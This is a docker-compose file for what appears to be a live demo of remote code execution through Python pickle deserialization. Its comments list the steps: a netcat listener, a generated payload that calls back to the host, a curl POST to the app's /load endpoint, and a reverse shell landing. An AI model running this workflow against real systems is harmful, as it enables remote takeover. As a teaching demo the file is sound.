# Pickle deserialization RCE demo.
# On stage:
#   1) host terminal:  nc -lvnp 4444
#   2) build/run:      docker compose up --build -d
#   3) make payload:   LISTENER_HOST=host.docker.internal python3 make_payload.py
#   4) send it:        curl -s -X POST http://localhost:5000/load -d "data=<base64>"
#   5) shell lands in terminal 1.
services:
  app:
    build: .
    ports:
      - "5000:5000"
    extra_hosts:
      - "host.docker.internal:host-gateway"
